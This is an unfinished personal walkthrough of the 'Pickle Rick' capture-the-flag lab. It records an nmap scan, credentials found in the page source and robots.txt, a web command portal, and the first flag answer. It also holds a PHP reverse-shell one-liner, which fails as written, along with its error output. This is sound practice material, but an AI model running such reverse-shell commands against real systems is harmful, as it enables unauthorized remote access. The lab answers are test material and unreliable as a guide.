@@ -1,0 +1,34 @@
+Pickle Rick CTF || Kyle Nelson Oct 5 2021
+==
+
+This Rick and Morty themed challenge requires you to exploit a webserver to find 3 ingredients that will help Rick make his potion to transform himself back into a human from a pickle.
+
+Running an initial Nmap [nmap -sT -A -p- 10.10.183.10 -oN scan1.txt] scan on the vuln machine reveals the following bits & bytes:
+--
+Right off the bat we found port 22 (SSH) and port 80 (HTTP) open with ~4% of scan done. 
+
+We also inspected the website and used wget on a picture from the /assets directory as well as found the username for login was R1ckRul3s. 
+
+We also found a /robots.txt directory with "Wubbalubbadubdub" written inside. This got us logged into 10.10.183.10/login.php > 10.10.183.10/portal.php where we can enter commands. Now I am going to try and wget a couple of txt files and read them. Found the key within Sup3rS3cretPickl3Ingred.txt. Key 1 Found!
+
+
+What is the first ingredient Rick needs?
+
+Mr. Meeseek Hair
+
+I think I am going to try a reverse shell here. Trying one of the walkthrough/write-ups and running commands to go up tot he root directory and print it's contents did not work for me. I also received the root "/" as the "pwd" but in reality I was in var/html/portal. I asssume they changed the challenge so I am going to document the failure and move to a reverse shell instead. Maybe this will allow more commands? 
+
+Command:
+php -r '$sock=fsockopen("http://10.10.182.117/portal.php",1234);exec("/bin/sh -i <&3 >&3 2>&3");'
+
+That gave:
+PHP Warning:  fsockopen(): unable to connect to http://10.10.182.117/portal.php:1234 (Unable to find the socket transport "http" - did you forget to enable it when you configured PHP?) in Command line code on line 1
+sh: 1: 3: Bad file descriptor
+
+No idea whats going on here at first glance. Reading.........
+
+Whats the second ingredient Rick needs?
+
+Whats the final ingredient Rick needs?
+
+
